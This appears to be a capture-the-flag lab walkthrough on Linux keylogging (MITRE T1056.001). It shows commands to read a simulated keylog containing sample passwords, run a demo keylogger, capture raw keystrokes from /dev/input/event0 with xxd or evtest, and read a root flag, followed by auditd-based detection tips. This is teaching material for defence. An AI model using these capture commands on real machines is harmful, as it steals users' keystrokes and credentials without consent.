# T1056.001 – Keylogging | Solution Walkthrough
**Difficulty:** Hard | **OS:** Linux | **MITRE:** T1056.001

## Step 1 – Review Simulated Capture
```bash
cat /tmp/simulated_keylog.txt
# Shows captured SSH passwords, sudo passwords, DB credentials
# ssh admin@192.168.1.100 → password: P@ssw0rd2024!
# mysql -u root -p → password: R00tDB!2024
# FLAG shown at bottom
```

## Step 2 – Run Demo Keylogger
```bash
python3 /opt/keylogger/keylogger.py
# Type anything — keystrokes logged to /tmp/keylog.txt
# Type 'STOP' to end
cat /tmp/keylog.txt
```

## Step 3 – /proc/bus/input Method (No library needed)
```bash
# Read raw keyboard events (requires root):
sudo cat /proc/bus/input/devices | grep -A 5 keyboard
sudo xxd /dev/input/event0  # Raw keyboard events
# Or use evtest:
sudo evtest /dev/input/event0
```

## Step 4 – Retrieve Flag
```bash
sudo cat /root/.flags/flag.txt
# HACKTIFY{KEYLOGGER_CAPTURE_<hash>}
```

## Detection
- Monitor: `/proc/bus/input/` reads by non-root processes
- auditd: `-w /dev/input -p r -k keylogger`
- Check for suspicious processes with `pynput`, `xlib`, or `/dev/input` access
